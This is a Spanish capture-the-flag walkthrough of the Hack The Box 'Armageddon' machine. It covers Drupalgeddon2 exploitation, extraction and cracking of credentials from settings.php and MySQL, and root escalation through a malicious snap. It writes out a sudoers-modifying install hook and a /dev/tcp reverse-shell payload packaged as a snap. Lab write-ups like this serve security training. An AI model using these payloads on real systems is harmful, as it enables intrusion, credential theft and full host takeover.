#by d4l1

<p align="center"><img src=""></p>
<h1 align="center">Armageddon</h1>

# ÍNDICE

# INICIO

Arageddib es una máquina Linux fácil. Encontramos un drupal vulnerable en una página web en el que podremos acceder remotamente al host.
Dentro de la enumeración de Drupal y su entrcutra de fichero encontramos las credenciales para conectarnos al servidor de MySQL y extraer el hash del usuario del sistema.
Con esas credenciales nos conectamos por SSH. Tenemos la disponibilidad de instalar aplicacion. Escalamos privilegios subiendo e instalando una aplicacion maliciosa

Para empezar el ping para comprobar

![image](https://github.com/D4l1-web/HTB/assets/79869523/da7167a0-810e-4f1c-9242-fe537d22af87)

Posteriormente el escaner de directorios

![image](https://github.com/D4l1-web/HTB/assets/79869523/bdb1ae67-cf5d-4ed7-9d73-bb5e6568fe35)

En el que encontramos dos puertos abiertos un puerto 22 SSH y un 80 con un apache 2.4.6 un drupta 7 e información relevante.

En mi caso utilizare searchspoit para buscar algún exploit sobre "drupal 7"

![image](https://github.com/D4l1-web/HTB/assets/79869523/773c384e-e52f-41c6-aad6-2bf15a5ffb11)

```
git clone https://github.com/dreadlocked/Drupalgeddon2.git
```
Alfinal me he metido con metasploit buscando el exploit directamente con un 
```
search drupal 7
```
He cogido el exploit drupaggedon2 he configurado los RHOST y los LHOST y estamos dentro con el usuario "apache"
![image](https://github.com/D4l1-web/HTB/assets/79869523/f8c9306e-fb27-4e87-a317-5ee974ba48f7)

Posteriormente me he ido a la ruta de la configuracion de la base de datos y hemos enumerado los archivos y encontrado la contraseña.

![image](https://github.com/D4l1-web/HTB/assets/79869523/f910248f-a65d-4dd8-abdd-9521194ba9e6)

```
cat /var/www/html/sites/default/settings.php
mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'show databases;'
```
![image](https://github.com/D4l1-web/HTB/assets/79869523/ab7bb26c-76e1-4f62-bbd5-cb4309238f6a)

![image](https://github.com/D4l1-web/HTB/assets/79869523/90a73146-b4ac-4ca6-a7cf-66866b07c376)

Con esto sacamos los hashes de los usuario e intentamos sacar la contraseña con el hash sacado 
```
DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
echo 'DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt' > hash
```

```
sudo hashcat -m 7900 -a 0 -o cracked.txt hash /usr/share/wordlists/rockyou.txt --force
```
Sacamos la pass "booboo"

y ya nos podemos conectar por ssh

![image](https://github.com/D4l1-web/HTB/assets/79869523/5746cc3b-5066-428b-b891-77af9d1bd908)

si hacemos un sudo -l encontramos que tenemos una ruta en la quep odemos instalar cositas

![image](https://github.com/D4l1-web/HTB/assets/79869523/1119ebe3-c83d-4f86-80ca-c3af13276b3e)

Podemos ejectuar comandos en base a ello como root sin necesida de contraseña esto nos abre muchsiimas puertas funciona como un sandbox. 

```
sudo apt update
sudo apt install snapd
sudo snap install --classic snapcraft
```

EL contenido del payload de snap debe tener un codigo que se ejecute en la instalación. Vamos acrear un pequeño script en bash que cree un usuaio con una contraseña y copie el codigo dentro de un archivo que nosotros queramos

```
# Make an empty directory to work with
mkdir new_snap
cd new_snap
# Initialize the directory as a snap project
snapcraft init
# Set up the install hook
mkdir snap/hooks
touch snap/hooks/install
chmod a+x snap/hooks/install
# Write the script we want to execute as root
cat > snap/hooks/install << "EOF"
#!/bin/bash
password="snap_user"
pass=$(perl -e 'print crypt($ARGV[0], "password")' $password)
useradd snap_user -m -p $pass -s /bin/bash
usermod -aG sudo snap_user
echo "snap_user ALL=(ALL:ALL) ALL" >> /etc/sudoers
EOF
# Configure the snap yaml file
cat > snap/snapcraft.yaml << "EOF"
name: snap-user
version: '0.1'
summary: Empty snap, used for exploit
description: |
 This is an example
grade: devel
confinement: devmode
parts:
 my-part:
 plugin: nil
EOF
# Build the snap
snapcraft
```
Deberemos cambiar los permisos para ejecutar
```
chmod +x snapcraft.sh
./snapcraft.sh
```
Cuando este todo copiaremos el codigo en la máquina remota
```
scp -r new_snap brucetherealadmin@ip:/tmp
```
y ahoora podremos instalar snap en la máquina remoda y usar sudo y modos de developer
```
cd /tmp/new_snap
sudo snap install --devmode snap-user_0.1_amd64.snap
```
Vale alfinal no he hecho nada de esto

dentro de nuestra máquina vamos a poner estos comandos
```
CMD="bash -c 'bash -i >& /dev/tcp/10.10.15.71/8055 0>&1'"
mkdir file; cd file
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$CMD" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n sh3ll -s dir -t snap -a all meta
```
```
scp sh3ll_1.0_all.snap brucetherealadmin@armageddon.htb:/tmp/tmp.Gmm08jw9f7/
sudo snap install sh3ll_1.0_all.snap --dangerous --devmode
```
GG



